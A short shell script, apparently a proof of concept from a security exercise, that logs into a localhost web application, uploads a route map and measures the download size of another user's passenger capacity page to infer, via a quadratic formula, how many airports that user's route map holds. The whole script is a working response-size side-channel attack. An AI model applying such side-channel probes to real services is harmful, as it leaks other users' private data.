#!/bin/sh

./login.sh usr pwd

# upload a route map
curl -s -L -b cookies.txt -F file=@user.txt -F "route_map_name=user" --insecure https://localhost:8443/add_route_map > /dev/null

user=`curl -s -b cookies.txt --insecure https://localhost:8443/passenger_capacity_matrix/1553932502 -w '%{size_download}\n' | tail -n1`

echo "User response= $user"
# uses the hacker 3247 baseline
solution=$(echo "(48-sqrt(48*48+4*19*($user-3180)))/(-2*19)" | bc)
# this formula was derived from: 
# baseline+105*(n-1)+38*(n-1)*(n-2)/2 where: 
# baseline= hacker resposne with 1 airport (3247)
# n= number of airports from the user
echo "Hacker side-channel using formula (48-sqrt(48*48+4*19*(user-3180)))/(-2*19) = $solution airports"
